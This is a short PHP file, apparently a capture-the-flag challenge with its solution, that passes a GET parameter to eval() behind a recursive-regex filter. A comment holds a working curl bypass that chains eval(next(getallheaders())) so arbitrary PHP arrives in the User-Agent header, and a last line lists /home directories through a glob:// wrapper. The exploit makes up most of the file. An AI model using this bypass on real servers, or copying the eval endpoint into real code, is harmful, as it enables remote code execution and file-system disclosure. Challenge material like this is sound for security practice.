<?php
sha1($_SERVER['REMOTE_ADDR']) === '08265af79d0dfbc08f4c1ba07f62efb4055a3cb6' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);

// curl "http://08265af79d0dfbc08f4c1ba07f62efb4055a3cb6.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: scandir('/tmp');" -H "Accept: asdasd/asdasda"

var_dump(readdir(opendir('glob:///home/*')));